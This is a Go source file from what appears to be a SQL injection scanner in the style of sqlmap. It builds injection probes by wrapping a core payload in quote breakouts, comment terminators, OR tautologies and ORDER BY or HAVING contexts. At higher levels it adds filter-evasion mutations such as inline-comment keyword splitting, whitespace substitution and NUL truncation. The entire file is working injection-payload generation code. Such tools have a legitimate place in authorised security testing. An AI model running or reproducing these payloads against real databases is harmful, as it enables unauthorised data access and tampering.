package payloads

import (
	"fmt"
	"strings"
)

// wrapper is a single prefix/suffix pair applied around a rendered core
// payload. minLevel gates the wrapper on the configured --level.
type wrapper struct {
	name     string
	prefix   string
	suffix   string
	minLevel int
}

// baseWrappers are always applied (level >= 1).
var baseWrappers = []wrapper{
	{name: "plain", prefix: "", suffix: ""},
	{name: "single-quote + comment", prefix: "'", suffix: "-- -"},
	{name: "double-quote + comment", prefix: `"`, suffix: "-- -"},
	{name: "comment", prefix: "", suffix: "-- -"},
	{name: "hash comment", prefix: "", suffix: "#"},
}

// parenWrappers become available at level >= 2.
var parenWrappers = []wrapper{
	{name: "paren single-quote + comment", prefix: "')", suffix: "-- -", minLevel: 2},
	{name: "paren double-quote + comment", prefix: `")`, suffix: "-- -", minLevel: 2},
	{name: "paren single-quote balance", prefix: "')", suffix: " AND ('1'='1", minLevel: 2},
	{name: "paren double-quote balance", prefix: `")`, suffix: ` AND ("1"="1`, minLevel: 2},
	{name: "double-paren single-quote + comment", prefix: "'))", suffix: "-- -", minLevel: 2},
	{name: "double-paren double-quote + comment", prefix: `"))`, suffix: "-- -", minLevel: 2},
}

// orWrappers become available at level >= 3. Their prefixes carry a leading OR
// operator so they combine with the payload's operator-agnostic core.
var orWrappers = []wrapper{
	{name: "OR single-quote + comment", prefix: "' OR ", suffix: "-- -", minLevel: 3},
	{name: "OR single-quote balanced", prefix: "' OR ", suffix: " OR '1'='2", minLevel: 3},
	{name: "OR double-quote balanced", prefix: `" OR `, suffix: ` OR "1"="2`, minLevel: 3},
	{name: "OR paren single-quote + comment", prefix: "') OR ", suffix: "-- -", minLevel: 3},
	{name: "order-by context", prefix: "", suffix: ",1", minLevel: 3},
	{name: "having context", prefix: "", suffix: " HAVING 1=1", minLevel: 3},
}

// whiteSpaceMutations are optional keyword-comment and whitespace mutations
// applied at level >= 4, per the wrapper spec (items 18-20).
type mutation struct {
	name string
	from string
	to   string
}

var keywordMutations = []mutation{
	{name: "comment-obfuscated AND", from: "AND", to: "A/**/ND"},
	{name: "comment-obfuscated OR", from: "OR", to: "O/**/R"},
	{name: "comment-obfuscated SELECT", from: "SELECT", to: "SEL/**/ECT"},
	{name: "comment-obfuscated UNION", from: "UNION", to: "UN/**/ION"},
}

var whitespaceMutations = []mutation{
	{name: "tab whitespace", from: " ", to: "\t"},
	{name: "newline whitespace", from: " ", to: "\n"},
	{name: "comment whitespace", from: " ", to: "/**/"},
}

// Expand takes a base payload, fills its placeholders with m, and applies the
// wrapper matrix up to the given level. The returned slice contains every
// concrete probe to send, in wrapper then mutation order.
//
// The level gating mirrors sqlmap's depth model:
//
//	level 1: base wrappers only
//	level 2: + parenthesis / quote balance variants
//	level 3: + OR variants and clause-aware (order-by / having) wrappers
//	level 4: + keyword-comment and whitespace mutations, %00 truncation
//	level 5: same full set (no additional wrappers, but no gating)
func Expand(p Payload, level int, m Macro) []RenderedPayload {
	core := Fill(p.Template, m)
	if level < 1 {
		level = 1
	}

	collect := func(wrappers []wrapper) []RenderedPayload {
		out := make([]RenderedPayload, 0, len(wrappers))
		for _, w := range wrappers {
			if w.minLevel > level {
				continue
			}
			out = append(out, RenderedPayload{
				Source:   p,
				Wrapper:  w.name,
				Rendered: w.prefix + core + w.suffix,
				Prefix:   w.prefix,
				Suffix:   w.suffix,
			})
		}
		return out
	}

	var out []RenderedPayload
	out = append(out, collect(baseWrappers)...)

	if level >= 2 {
		out = append(out, collect(parenWrappers)...)
	}
	if level >= 3 {
		out = append(out, collect(orWrappers)...)
	}

	// Level >= 4: optional NUL-truncation and mutation variants. These are
	// generated as extra probes appended after the stock wrappers.
	if level >= 4 {
		// %00 / NUL truncation of the whole rendered value.
		for _, r := range collect(baseWrappers) {
			out = append(out, RenderedPayload{
				Source:   p,
				Wrapper:  r.Wrapper + " + NUL truncation",
				Rendered: r.Rendered + "%00",
				Prefix:   r.Prefix,
				Suffix:   r.Suffix + "%00",
			})
		}
		// keyword-obfuscated inline-comment mutations.
		for _, mut := range keywordMutations {
			if !strings.Contains(strings.ToUpper(core), mut.from) {
				continue
			}
			ob := obfuscate(core, mut.from, mut.to)
			out = append(out, RenderedPayload{
				Source:   p,
				Wrapper:  "keyword mutation '" + mut.name + "'",
				Rendered: ob,
			})
		}
		// whitespace mutations on the core before wrappers.
		for _, mut := range whitespaceMutations {
			if !strings.Contains(core, " ") {
				continue
			}
			out = append(out, RenderedPayload{
				Source:   p,
				Wrapper:  "whitespace mutation '" + mut.name + "'",
				Rendered: strings.Replace(core, mut.from, mut.to, 1),
			})
		}
	}
	return out
}

// obfuscate replaces only the first uppercase occurrence of from in upper, but
// preserves the original casing of the rest of the template by operating on the
// original string via case-insensitive replacement of the first token.
func obfuscate(s, from, to string) string {
	up := strings.ToUpper(s)
	idx := strings.Index(up, from)
	if idx < 0 {
		return s
	}
	return s[:idx] + to + s[idx+len(from):]
}

// ExpandCount returns how many concrete probes Expand would produce for a
// payload at the given level. Useful for request-budget logging.
func ExpandCount(p Payload, level int, m Macro) int {
	return len(Expand(p, level, m))
}

// DescribeWrapperReport formats a per-level expansion table for diagnostics.
func DescribeWrapperReport(p Payload, level int, m Macro) string {
	rendered := Expand(p, level, m)
	var b strings.Builder
	fmt.Fprintf(&b, "payload %s @ level %d -> %d probes\n", p.ID, level, len(rendered))
	for _, r := range rendered {
		fmt.Fprintf(&b, "  [%s] %s\n", r.Wrapper, r.Rendered)
	}
	return b.String()
}
